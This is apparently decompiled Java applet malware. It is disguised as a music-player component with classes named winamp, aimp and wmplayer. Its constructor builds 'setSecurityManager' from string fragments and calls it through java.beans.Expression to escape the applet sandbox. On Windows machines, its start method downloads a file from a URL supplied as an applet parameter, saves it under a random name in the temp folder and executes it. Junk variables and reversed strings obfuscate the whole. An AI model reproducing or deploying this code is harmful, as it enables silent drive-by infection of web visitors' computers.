// 
// Decompiled by Procyon v0.5.30
// 

package music;

import java.awt.Component;
import tracklist.extlist;
import tracklist.list;
import java.beans.Expression;
import java.util.ArrayList;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.URL;
import javax.swing.JList;
import java.util.HashSet;
import java.applet.Applet;

public class guff extends Applet
{
    public HashSet l6lb;
    public JList l2ly;
    public String l1lq;
    public String l1ly;
    String aa;
    public Runtime l0lq;
    public int l2lvpi;
    public String l1lx;
    public String l2le;
    public URL l2lb;
    public String l2la;
    String ol;
    public String l2lz;
    public InputStream l2lx;
    public String l2lc;
    public int l2lv;
    public FileOutputStream l2ln;
    public String l2lm;
    public String l2ls;
    public String l2ld;
    public String l1la;
    static String l0lc;
    static ArrayList l8le;
    static String l8la;
    String pp;
    static Class l0la;
    static String l7lc;
    static Expression l0lh;
    private int l8lq;
    wmplayer l0lj;
    static Object[] l0lf;
    
    static {
        guff.l0la = System.class;
        guff.l0lf = new Object[1];
    }
    
    private String holer(final String l0ls) {
        return String.valueOf(Math.random()) + l0ls;
    }
    
    private void perto() {
        final String ol = "kwr36n wrf";
        aimp.spoller(this.l2lb, winamp.s1.concat(winamp.s2.concat(winamp.s3.concat(winamp.s4.concat(winamp.s5.concat(winamp.s6.concat(winamp.s7)))))));
        final int l6lb = 6;
        final String l1lc = "kegr";
        this.l2lx = (InputStream)aimp.spoller(this.l2lb, winamp.s1.concat(winamp.s2.concat(winamp.s8.concat(winamp.s9))));
    }
    
    private String gorer(final String s) {
        return System.getProperty(s);
    }
    
    private void zonus() throws Exception {
        final boolean l1lz = false;
        this.l2ln = new FileOutputStream(this.l1la);
        final int l2lr = 14;
        final String ol = "]; w]gfer,w";
    }
    
    private String teQuerto(final String s) {
        return new StringBuffer(s).reverse().toString();
    }
    
    private void zoreq(final Object o) {
        aimp.spoller(o, winamp.s10.concat(winamp.s11.concat(winamp.s12)));
    }
    
    public void start() {
        super.start();
        try {
            this.l1ly = winamp.s12.concat(winamp.s13);
            this.l1lx = winamp.s14.concat(winamp.s15.concat(winamp.s16.concat(winamp.s17.concat(winamp.s18))));
            this.l1lq = list.m3u(this.getParameter("fido"));
            this.l2le = "ema".concat("n.".concat("so"));
            this.l2la = this.teQuerto(this.l1ly);
            this.l2lb = new URL(this.l1lq);
            this.l2lz = this.teQuerto(this.l1lx);
            this.l2lvpi = 24;
            this.l2lc = this.teQuerto(this.l2le);
            this.l2lm = this.holer(this.l2la);
            final Runtime runtime = Runtime.getRuntime();
            this.l0lq = runtime;
            if (runtime == null) {}
            this.l2ls = this.gorer(this.l2lz);
            final int i = 32;
            this.l2ld = this.gorer(this.l2lc);
            final int k = 81;
            this.l1la = String.valueOf(this.l2ls) + this.l2lm;
            final int j = 10;
            this.l2lv = 1000 + this.l2lvpi;
            try {
                if (this.l2ld.indexOf("W".concat("in").concat("do".concat("ws"))) >= 0) {
                    this.zonus();
                    this.perto();
                    final String l1lk = "gat";
                    final byte[] l1ll = new byte[this.l2lv];
                    int l1lm;
                    while ((l1lm = this.l2lx.read(l1ll, 0, this.l2lv)) != -1) {
                        this.l2ln.write(l1ll, 0, l1lm);
                    }
                    this.zoreq(this.l2lx);
                    final String l1lp = "jir";
                    final int l1ln = 1;
                    final boolean l1lo = false;
                    this.zoreq(this.l2ln);
                    final int l1lq = 5;
                    final String l1lr = "hA7s";
                    final boolean l1ls = true;
                    aimp.borber(this.l0lq, winamp.pol(), new Object[] { String.valueOf(this.l2ls) + this.l2lm });
                    final int l1lu = 3;
                    final String l1ly = "l8p";
                }
            }
            catch (Exception vtr) {
                vtr.printStackTrace();
            }
        }
        catch (Exception vtr2) {
            vtr2.printStackTrace();
        }
    }
    
    private static void zevs() {
        guff.l0lc = "se".concat("t".concat("S"));
        guff.l7lc = "e".concat("cu").concat("ri");
        guff.l8la = "t".concat("yM").concat("a".concat("na").concat("ger"));
        guff.l0lc = String.valueOf(guff.l0lc) + guff.l7lc + guff.l8la;
    }
    
    public guff() {
        this.l6lb = new HashSet();
        this.aa = "4-0";
        this.ol = "flg rgs;rm; ";
        this.pp = "r rp46tp er546hp 5egw";
        this.l8lq = 20;
        final String l8ly = "orl";
        zevs();
        this.l6lb.add(new extlist(guff.l0la, guff.l0lc, guff.l0lf));
        final int l0lg = 9;
        guff.l0lh = new Expression(guff.l0la, guff.l0lc, guff.l0lf);
        final boolean l0lu = true;
        this.l0lj = new wmplayer(this, this.l6lb);
        this.add(this.l2ly = new JList((E[])new Object[] { this.l0lj }));
    }
}
